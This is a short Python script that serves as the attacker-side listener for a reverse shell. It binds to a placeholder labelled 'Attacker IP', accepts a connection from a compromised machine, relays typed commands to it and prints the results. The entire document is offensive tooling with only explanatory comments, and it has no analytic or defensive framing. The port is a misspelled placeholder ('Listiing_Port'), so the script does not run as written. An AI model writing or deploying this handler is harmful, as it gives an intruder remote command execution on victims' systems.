import socket

# Set the IP and port to listen on
bind_ip = 'Attacker IP'
bind_port = Listiing_Port

# Create a socket and bind it to the specified IP and port
s = socket.socket()
s.bind((bind_ip, bind_port))

# Start listening for incoming connections
s.listen(1)
print('Listening for incoming connections...')

# Accept the incoming connection
client, addr = s.accept()
print(f'Connection from {addr[0]}:{addr[1]}')

# While the connection is active, send commands to the client and receive output
while True:
    # Send a command to the client
    command = input('Enter command: ')
    client.send(command.encode())

    # If the command is 'exit', close the connection
    if command == 'exit':
        break

    # Otherwise, receive the output from the client
    output = client.recv(1024).decode()
    print(output)

# Close the connection
client.close()
